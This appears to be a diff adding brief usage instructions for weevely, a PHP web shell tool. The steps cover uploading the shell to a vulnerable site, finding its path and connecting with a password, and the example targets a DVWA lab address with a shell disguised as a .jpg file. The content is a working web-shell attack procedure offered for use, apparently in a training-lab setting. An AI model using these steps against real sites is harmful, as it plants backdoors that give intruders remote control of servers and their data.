@@ -1,0 +1,5 @@
+  how to use:
+1. upload your weevely script to vulnurable web
+2. find the path to the uploaded script on the web
+3. execute weevely *uploaded script location / path on web* *password*
+ex: weevely http://10.0.2.4/dvwa/hackables/uploads/shell.jpg 123456
